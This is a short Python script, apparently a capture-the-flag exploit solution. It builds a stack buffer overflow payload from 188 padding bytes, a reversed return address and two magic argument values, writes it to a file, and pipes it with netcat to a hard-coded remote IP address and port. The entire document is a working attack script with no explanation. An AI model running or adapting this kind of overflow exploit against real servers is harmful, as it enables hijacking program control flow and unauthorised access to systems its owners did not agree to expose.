import os

exploit = b"A"*188 + b"\x08\x04\x91\xe2"[::-1] + b"QU1T" + b"\xde\xad\xbe\xef"[::-1] + b"\xc0\xde\xd0\x0d"[::-1]

f = open("exploit.txt", "wb") 
f.write(exploit)
f.close()

os.system("cat exploit.txt - | nc 159.65.92.13 30986")

